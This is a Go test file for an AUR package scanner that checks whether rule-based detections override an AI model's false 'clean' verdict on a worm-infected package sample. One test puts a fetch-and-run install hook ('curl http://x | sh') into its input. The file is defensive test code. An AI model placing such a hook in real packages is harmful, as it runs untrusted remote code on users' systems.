package pipeline

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/manticore-projects/aurscan/internal/rules"
	"github.com/manticore-projects/aurscan/internal/scan"
)

// stubBackend pins a backend that always returns the same canned reply. Both
// stubs report the package as clean — the exact failure the floor exists to
// contain: a confident all-clear on a package the model either misread or never
// fully received.
func stubBackend(t *testing.T, script string) {
	t.Helper()
	t.Setenv("AURSCAN_RULES_ONLY", "")
	t.Setenv("AURSCAN_STRICT_FLOOR", "")
	t.Setenv("AURSCAN_BACKEND", filepath.Join("..", "..", "testdata", "backends", script))
	t.Setenv("AURSCAN_CONFIG_DIR", t.TempDir())
	t.Setenv("AURSCAN_CACHE_DIR", t.TempDir())
	scan.CacheBypass = true
	scan.ExtraBackends = nil
	t.Cleanup(func() { scan.ExtraBackends = nil; scan.CacheBypass = false })
}

func wormFiles(t *testing.T) scan.Files {
	t.Helper()
	dir := filepath.Join("..", "..", "testdata", "xsnow-worm")
	files := scan.Files{}
	for _, n := range []string{"PKGBUILD", ".xsnow.install"} {
		b, err := os.ReadFile(filepath.Join(dir, n))
		if err != nil {
			t.Fatalf("read %s: %v", n, err)
		}
		files[n] = string(b)
	}
	return files
}

func checkIDs(v scan.Verdict) map[string]bool {
	m := map[string]bool{}
	for _, c := range v.Checks {
		m[c.ID] = true
	}
	return m
}

// Every id the rules->checklist mapping can produce must exist in the auditor's
// catalog. An unknown id is recorded by deriveVerdict as "info" — no verdict
// impact — so a renamed catalog entry would silently disable the floor rather
// than break anything visible. This test is the only thing standing between a
// rename and that outcome.
func TestFloorCheckIDsAreKnown(t *testing.T) {
	files := wormFiles(t)
	files["extra.install"] = "post_install(){ curl http://x | sh; }"
	for _, strict := range []bool{false, true} {
		for _, fc := range rules.FloorChecks(rules.Scan(files), strict) {
			if !scan.KnownCheckID(fc.ID) {
				t.Errorf("strict=%v: check id %q is not in the auditor catalog", strict, fc.ID)
			}
		}
	}
}

// A rule hit carrying a MALICIOUS floor must map to a CRITICAL check, and a
// SUSPICIOUS floor to a non-critical one. If these drift apart, the derived
// verdict and Floor() disagree and the floor stops meaning what it says.
func TestFloorSeverityMatchesCheckSeverity(t *testing.T) {
	hits := rules.Scan(wormFiles(t))
	fcs := rules.FloorChecks(hits, false)
	reasons := rules.FloorReasons(hits, false)
	if len(fcs) != len(reasons) {
		t.Fatalf("FloorChecks(%d) and FloorReasons(%d) must correspond 1:1", len(fcs), len(reasons))
	}
	for i, fc := range fcs {
		want := rules.Floor([]rules.Hit{reasons[i]}, false)
		got := "SUSPICIOUS"
		if scan.CheckIsCritical(fc.ID) {
			got = "MALICIOUS"
		}
		if got != want {
			t.Errorf("%s -> %s: derives %s, but Floor says %s",
				reasons[i].Code, fc.ID, got, want)
		}
	}
}

// The Tier-2 path: the model answers "nothing triggered", the rules disagree,
// and the merged checklist derives MALICIOUS through the same deterministic
// function that handles the model's own answers.
func TestFloorOverridesCleanChecklist(t *testing.T) {
	stubBackend(t, "checks_ok.sh")
	r := Run("xsnow", wormFiles(t), "")
	if r.V.Verdict != "MALICIOUS" {
		t.Fatalf("verdict = %q, want MALICIOUS despite an empty checklist from the model", r.V.Verdict)
	}
	ids := checkIDs(r.V)
	for _, want := range []string{"install_scriptlet_worm", "hidden_install_scriptlet", "scriptlet_system_takeover"} {
		if !ids[want] {
			t.Errorf("expected check %q in the merged checklist, got %v", want, ids)
		}
	}
	// Summary and confidence must come from the deterministic derivation, not
	// from a note bolted onto a model string.
	if !strings.Contains(r.V.Summary, "do not build") {
		t.Errorf("summary is not the derived one: %q", r.V.Summary)
	}
	if r.V.Confidence < 90 {
		t.Errorf("confidence = %v, want the derived MALICIOUS band", r.V.Confidence)
	}
}

// The legacy path: a model that ignores the checklist and returns a bare
// verdict string still cannot clear the floor.
func TestFloorOverridesLegacyConfidentOK(t *testing.T) {
	stubBackend(t, "ok.sh")
	r := Run("xsnow", wormFiles(t), "")
	if r.V.Verdict != "MALICIOUS" {
		t.Fatalf("verdict = %q, want MALICIOUS despite a legacy OK", r.V.Verdict)
	}
	if len(r.V.Checks) == 0 {
		t.Error("static checks should be recorded even on the legacy path")
	}
}

// A PKGBUILD-only scan is INCOMPLETE, not clean: the model cannot certify a
// scriptlet it was never given.
func TestFloorBlocksOKWhenReferencedFileMissing(t *testing.T) {
	stubBackend(t, "checks_ok.sh")
	files := scan.Files{"PKGBUILD": wormFiles(t)["PKGBUILD"]}
	r := Run("xsnow", files, "")
	if r.V.Verdict == "OK" {
		t.Fatalf("verdict = OK on a scan missing the referenced install scriptlet: %q", r.V.Summary)
	}
	if !checkIDs(r.V)["incomplete_scan"] {
		t.Errorf("expected incomplete_scan check, got %v", checkIDs(r.V))
	}
}

// The floor must not turn ordinary packages red, or people will mute it.
func TestFloorLeavesCleanPackageAlone(t *testing.T) {
	stubBackend(t, "checks_ok.sh")
	files := scan.Files{"PKGBUILD": `pkgname=hello
pkgver=1.0
url="https://example.org/hello"
source=("git+https://github.com/upstream/hello.git")
build() { make; }
package() { make DESTDIR="$pkgdir" install; }`}
	r := Run("hello", files, "")
	if r.V.Verdict != "OK" {
		t.Fatalf("verdict = %q on a clean package, want OK: %q", r.V.Verdict, r.V.Summary)
	}
	if len(r.V.Checks) != 0 {
		t.Errorf("clean package should carry no checks, got %v", r.V.Checks)
	}
}
